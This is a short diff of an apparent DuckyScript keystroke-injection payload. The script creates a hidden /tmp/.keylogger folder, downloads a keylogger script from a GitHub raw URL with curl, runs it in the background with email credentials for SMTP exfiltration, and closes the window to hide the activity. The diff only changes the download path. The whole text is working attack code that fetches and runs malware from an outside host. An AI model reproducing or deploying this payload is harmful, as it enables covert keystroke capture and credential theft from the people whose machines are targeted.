@@ -8,7 +8,7 @@ ENTER
 STRING mkdir -p /tmp/.keylogger && cd /tmp/.keylogger
 ENTER
 REM You need to change the value of the EMAIL & PASSWORD
-STRING curl -o .keylogger.py https://raw.githubusercontent.com/dosseggegw1/Hackable/master/keyloggers/keylogger-smtp.py && python3 .keylogger.py EMAIL MDP&
+STRING curl -o .keylogger.py https://raw.githubusercontent.com/dosseggegw1/Hackable/master/Stockage_Pi/.keylogger-smtp.py && python3 .keylogger.py EMAIL MDP&
 ENTER
 DELAY 2000
 ALT F4
